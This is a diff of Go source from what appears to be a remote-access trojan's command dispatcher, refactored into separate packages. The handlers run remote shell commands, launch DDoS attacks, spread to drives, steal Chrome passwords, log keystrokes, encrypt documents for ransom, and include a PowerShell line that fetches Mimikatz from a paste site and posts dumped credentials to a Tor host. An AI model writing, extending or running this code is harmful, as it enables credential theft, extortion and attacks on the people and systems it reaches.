@@ -2,6 +2,15 @@ package network
 
 import "strings"
 import "github.com/sqweek/dialog"
+import "../utils"
+import "../aes"
+import "../pay"
+import "../spread"
+import "../passwords"
+import (
+	"../install"
+	"../dos"
+)
 
 /*
 #include <stdio.h>
@@ -12,18 +21,18 @@ import "github.com/sqweek/dialog"
 import "C"
 
 func Execute(command string, target string, args string) {
-	if target == "*" || target == GetUsername() {
+	if target == "*" || target == utils.GetUsername() {
 		switch command {
 		case "cmd":
-			Run(args)
+			utils.Run(args)
 		case "off":
-			Run("shutdown /p /f")
+			utils.Run("shutdown /p /f")
 		case "lo":
-			Run("shutdown /l /f")
+			utils.Run("shutdown /l /f")
 		case "kill":
-			Run("taskkill /IM " + args + " /T /f")
+			utils.Run("taskkill /IM " + args + " /T /f")
 		case "msg":
-			Run("msg * " + strings.Replace(args, "-", " ", -1))
+			utils.Run("msg * " + strings.Replace(args, "-", " ", -1))
 		case "yn":
 			title := "Alert"
 			var text string
@@ -36,51 +45,47 @@ func Execute(command string, target string, args string) {
 			}
 			res := dialog.Message("%s", text).Title(title).YesNo()
 			if res == true {
-				Send("yn", GetUsername()+" responds yes")
+				Send("yn", utils.GetUsername()+" responds yes")
 			} else {
-				Send("yn", GetUsername()+" responds no")
+				Send("yn", utils.GetUsername()+" responds no")
 			}
 
 		case "web":
-			Run("start " + args) //  Use /MIN to start minimized
+			utils.Run("start " + args) //  Use /MIN to start minimized
 		case "ddos":
-			DdosApi(100, args)
+			dos.DdosApi(100, args)
 		case "sdd":
-			StopDdos()
+			dos.StopDdos()
 		case "inf":
 		case "infect":
-			CopyToDrives()
+			spread.CopyToDrives()
 		case "pass":
-			Send("pass", GetChromePassString())
+			Send("pass", passwords.GetChromePassString())
 		case "autoInf":
-			AutoInfect()
+			spread.AutoInfect()
 		case "stopAutoInf":
-			StopAutoInfect()
+			spread.StopAutoInfect()
 		case "upgrade":
-			Upgrade(args)
+			install.Upgrade(args)
 		case "uninstall":
-			Uninstall()
-		case "getav":
-			Send("res", GetAV())
-		case "meterpreter":
-			Meterpreter(strings.Split(args, ":")[0], strings.Split(args, ":")[1])
+			install.Uninstall()
 		case "start-keylogger":
-			keyLogger()
+			passwords.KeyLogger()
 		case "keylog":
-			Send("res", tmpKeylog)
+			Send("res", utils.TmpKeylog)
 		case "please":
-			Please(args)
+			utils.Please(args)
 		case "mimi":
-			Run(`powershell "IEX (New-Object Net.WebClient).DownloadString('https://paste.ee/r/0ZlX2'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://` + GetIp() + `', 'POST' , $output)"`)
+			utils.Run(`powershell "IEX (New-Object Net.WebClient).DownloadString('https://paste.ee/r/0ZlX2'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://` + getIPTor() + `', 'POST' , $output)"`)
 		case "ransom":
-			EncryptExternalDrives(true)
-			EncryptDocumets("C:\\", true)
+			spread.EncryptExternalDrives(true)
+			aes.EncryptDocumets("C:\\", true)
 			//Encrypt net drives
 
 			// Once encrypted
 			//WriteRegDone()
 			// Write done to pastebin
-			PromtPay()
+			pay.PromtPay()
 
 			//ListenForPayment()
 
